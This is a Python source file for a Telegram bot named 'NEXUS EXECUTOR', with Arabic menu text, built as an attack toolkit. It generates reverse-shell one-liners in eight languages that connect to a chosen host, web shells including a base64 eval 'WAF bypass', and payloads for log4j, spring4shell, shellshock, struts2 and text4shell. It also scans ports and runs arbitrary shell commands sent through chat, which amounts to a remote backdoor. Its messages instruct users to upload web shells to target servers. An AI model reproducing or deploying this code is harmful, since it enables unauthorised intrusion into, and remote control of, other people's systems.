#!/usr/bin/env python3
import os
import sys
import time
import json
import socket
import subprocess
import threading
import requests
import base64
import hashlib
import random
import string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not TOKEN:
    print("❌ TELEGRAM_TOKEN not set")
    sys.exit(1)

print(f"[*] TOKEN: {TOKEN[:8]}...{TOKEN[-4:]}")

# ============================================================
# 1. محرك التنفيذ الحقيقي
# ============================================================
class NexusExecutor:
    def __init__(self):
        self.results = []
        self.session = requests.Session()
        self.session.verify = False

    def execute_system_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr
        except Exception as e:
            return f"خطأ: {e}"

    def generate_reverse_shell(self, lang, host, port):
        shells = {
            "python": f'''python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{host}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"''',
            "bash": f"bash -i >& /dev/tcp/{host}/{port} 0>&1",
            "php": f'''php -r '$s=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
            "perl": f"perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
            "ruby": f"ruby -rsocket -e 'c=TCPSocket.new(\"{host}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
            "nc": f"nc -e /bin/sh {host} {port}",
            "nc_bsd": f"rm -f /tmp/backpipe;mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc {host} {port} 1>/tmp/backpipe",
            "powershell": f'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''
        }
        return shells.get(lang, "لغة غير مدعومة")

    def generate_webshell(self, lang):
        webshells = {
            "php": '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]." 2>&1");} ?>',
            "php_advanced": '<?php $c=$_GET["cmd"]; system($c." 2>&1"); ?>',
            "php_waf_bypass": '<?php $p=$_GET["x"]; eval(base64_decode($p)); ?>',
            "jsp": '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            "jsp_advanced": '<% Process p = Runtime.getRuntime().exec(request.getParameter("c")); %>',
            "asp": '<% eval request("cmd") %>',
            "asp_advanced": '<% response.write(createobject("wscript.shell").exec(request("c")).stdout.readall()) %>',
            "node": 'require("child_process").exec(req.query.cmd, (e,d) => res.send(d))',
            "python": 'import os, sys, cgi; form = cgi.FieldStorage(); cmd = form.getvalue("cmd"); os.system(cmd)'
        }
        return webshells.get(lang, "لغة غير مدعومة")

    def generate_exploit(self, name, host, port):
        exploits = {
            "log4j": f'${{jndi:ldap://{host}:{port}/Exploit}}',
            "log4j_waf": '${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://HOST_PLACEHOLDER/a'.replace("HOST_PLACEHOLDER", host),
            "spring4shell": f'''class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{{2}}i
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT''',
            "shellshock": '() { :; }; /bin/bash -c "id"',
            "shellshock_useragent": '() { :; }; /bin/bash -c "id"',
            "struts2": 'redirect:${%23a%3dnew%20java.lang.ProcessBuilder("id").start()}',
            "text4shell": f'${{script:javascript:java.lang.Runtime.getRuntime().exec("id")}}',
            "text4shell_dns": f'${{script:javascript:java.net.InetAddress.getByName("{host}")}}'
        }
        return exploits.get(name, "ثغرة غير مدعومة")

    def scan_ports(self, target):
        open_ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 9000]
        for port in common_ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((target, port)) == 0:
                    open_ports.append(port)
                s.close()
            except:
                pass
        return open_ports

    def execute_ping(self, target):
        try:
            result = subprocess.run(f"ping -c 4 {target}", shell=True, capture_output=True, text=True, timeout=10)
            return result.stdout
        except:
            return "فشل ping"

    def execute_dns_lookup(self, domain):
        try:
            import dns.resolver
            records = {}
            for rtype in ['A', 'MX', 'NS', 'TXT']:
                try:
                    answers = dns.resolver.resolve(domain, rtype)
                    records[rtype] = [str(r) for r in answers]
                except:
                    records[rtype] = []
            return json.dumps(records, indent=2)
        except ImportError:
            try:
                result = subprocess.run(f"nslookup {domain}", shell=True, capture_output=True, text=True, timeout=10)
                return result.stdout
            except:
                return "فشل استعلام DNS"

    def execute_whois(self, domain):
        try:
            result = subprocess.run(f"whois {domain}", shell=True, capture_output=True, text=True, timeout=15)
            return result.stdout[:500] + "..." if len(result.stdout) > 500 else result.stdout
        except:
            return "whois غير مثبت أو فشل"

# ============================================================
# 2. بوت تيليجرام
# ============================================================
executor = NexusExecutor()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💀 شيل عكسي", callback_data="reverse")],
        [InlineKeyboardButton("🌐 Web Shell", callback_data="webshell")],
        [InlineKeyboardButton("🔥 استغلال ثغرة", callback_data="exploit")],
        [InlineKeyboardButton("🔍 مسح منافذ", callback_data="scan")],
        [InlineKeyboardButton("🖥️ تنفيذ أمر", callback_data="shell")],
        [InlineKeyboardButton("📋 معلومات", callback_data="info")]
    ]
    await update.message.reply_text(
        "👹 **NEXUS EXECUTOR**\nالأداة التنفيذية الحقيقية\nاختر الهجوم من القائمة:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "reverse":
        await query.edit_message_text(
            "💀 **توليد شيل عكسي**\n\nاستخدم الأمر:\n`/reverse <لغة> <IP> <منفذ>`\n\nاللغات المدعومة:\n`python, bash, php, perl, ruby, nc, nc_bsd, powershell`\n\nمثال:\n`/reverse python 192.168.1.100 4444`",
            parse_mode='Markdown'
        )
    elif query.data == "webshell":
        await query.edit_message_text(
            "🌐 **توليد Web Shell**\n\nاستخدم الأمر:\n`/webshell <لغة>`\n\nاللغات المدعومة:\n`php, php_advanced, php_waf_bypass, jsp, jsp_advanced, asp, asp_advanced, node, python`\n\nمثال:\n`/webshell php`",
            parse_mode='Markdown'
        )
    elif query.data == "exploit":
        await query.edit_message_text(
            "🔥 **استغلال ثغرة**\n\nاستخدم الأمر:\n`/exploit <اسم> <IP> <منفذ>`\n\nالثغرات المدعومة:\n`log4j, log4j_waf, spring4shell, shellshock, struts2, text4shell`\n\nمثال:\n`/exploit log4j 192.168.1.100 1389`",
            parse_mode='Markdown'
        )
    elif query.data == "scan":
        await query.edit_message_text(
            "🔍 **مسح المنافذ**\n\nاستخدم الأمر:\n`/scan <IP>`\n\nمثال:\n`/scan 192.168.1.1`",
            parse_mode='Markdown'
        )
    elif query.data == "shell":
        await query.edit_message_text(
            "🖥️ **تنفيذ أمر نظام**\n\nاستخدم الأمر:\n`/shell <أمر>`\n\nمثال:\n`/shell whoami`",
            parse_mode='Markdown'
        )
    else:
        await query.edit_message_text(
            f"🖥️ **معلومات النظام**\n\nالمنصة: {sys.platform}\nبايثون: {sys.version[:30]}\nالوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n📋 الأوامر المتاحة:\n/reverse <لغة> <IP> <منفذ>\n/webshell <لغة>\n/exploit <اسم> <IP> <منفذ>\n/scan <IP>\n/shell <أمر>\n/ping <IP>\n/dns <دومين>\n/whois <دومين>"
        )

async def reverse_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("❗ استخدم: `/reverse <لغة> <IP> <منفذ>`")
        return
    lang, host, port = args[0], args[1], args[2]
    shell = executor.generate_reverse_shell(lang, host, port)
    await update.message.reply_text(
        f"💀 **شيل عكسي بـ {lang}**\n\n```\n{shell}\n```\n\n🌐 الهدف: {host}:{port}",
        parse_mode='Markdown'
    )

async def webshell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("❗ استخدم: `/webshell <لغة>`")
        return
    lang = args[0]
    shell = executor.generate_webshell(lang)
    await update.message.reply_text(
        f"🌐 **Web Shell بـ {lang}**\n\n```\n{shell}\n```\n\n📌 احفظ الملف باسم `shell.{lang}` وارفعه للسيرفر\n📌 استخدم: `http://target.com/shell.{lang}?cmd=whoami`",
        parse_mode='Markdown'
    )

async def exploit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("❗ استخدم: `/exploit <اسم> <IP> <منفذ>`")
        return
    name, host, port = args[0], args[1], args[2]
    exploit = executor.generate_exploit(name, host, port)
    await update.message.reply_text(
        f"🔥 **استغلال {name}**\n\n```\n{exploit}\n```\n\n🌐 الهدف: {host}:{port}",
        parse_mode='Markdown'
    )

async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("❗ استخدم: `/scan <IP>`")
        return
    target = args[0]
    await update.message.reply_text(f"🔍 جاري مسح {target}...")
    ports = executor.scan_ports(target)
    if ports:
        await update.message.reply_text(f"🔍 **نتائج مسح {target}**\n\nالمنافذ المفتوحة:\n" + "\n".join(f"- {p}" for p in ports))
    else:
        await update.message.reply_text(f"❌ لا توجد منافذ مفتوحة على {target}")

async def shell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("❗ استخدم: `/shell <أمر>`")
        return
    cmd = " ".join(args)
    await update.message.reply_text(f"🖥️ تنفيذ: `{cmd}`", parse_mode='Markdown')
    result = executor.execute_system_command(cmd)
    if len(result) > 4000:
        result = result[:4000] + "..."
    await update.message.reply_text(f"```\n{result}\n```", parse_mode='Markdown')

async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("❗ استخدم: `/ping <IP>`")
        return
    target = args[0]
    await update.message.reply_text(f"📡 جاري ping لـ {target}...")
    result = executor.execute_ping(target)
    await update.message.reply_text(f"```\n{result}\n```", parse_mode='Markdown')

async def dns_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("❗ استخدم: `/dns <دومين>`")
        return
    domain = args[0]
    await update.message.reply_text(f"🔍 جاري استعلام DNS لـ {domain}...")
    result = executor.execute_dns_lookup(domain)
    await update.message.reply_text(f"```\n{result}\n```", parse_mode='Markdown')

async def whois_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("❗ استخدم: `/whois <دومين>`")
        return
    domain = args[0]
    await update.message.reply_text(f"📋 جاري استعلام WHOIS لـ {domain}...")
    result = executor.execute_whois(domain)
    await update.message.reply_text(f"```\n{result}\n```", parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 **الأوامر المتاحة:**\n\n"
        "/start - القائمة الرئيسية\n"
        "/reverse <لغة> <IP> <منفذ> - توليد شيل عكسي\n"
        "/webshell <لغة> - توليد Web Shell\n"
        "/exploit <اسم> <IP> <منفذ> - استغلال ثغرة\n"
        "/scan <IP> - مسح المنافذ\n"
        "/shell <أمر> - تنفيذ أمر نظام\n"
        "/ping <IP> - اختبار اتصال\n"
        "/dns <دومين> - استعلام DNS\n"
        "/whois <دومين> - استعلام WHOIS\n"
        "/help - هذه الرسالة"
    )

# ============================================================
# 3. التشغيل الرئيسي
# ============================================================
def main():
    print("[*] جاري تشغيل NEXUS EXECUTOR...")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(CommandHandler("reverse", reverse_command))
    app.add_handler(CommandHandler("webshell", webshell_command))
    app.add_handler(CommandHandler("exploit", exploit_command))
    app.add_handler(CommandHandler("scan", scan_command))
    app.add_handler(CommandHandler("shell", shell_command))
    app.add_handler(CommandHandler("ping", ping_command))
    app.add_handler(CommandHandler("dns", dns_command))
    app.add_handler(CommandHandler("whois", whois_command))
    app.add_handler(CommandHandler("help", help_command))
    print("✅ NEXUS EXECUTOR يعمل...")
    app.run_polling()

if __name__ == "__main__":
    main()
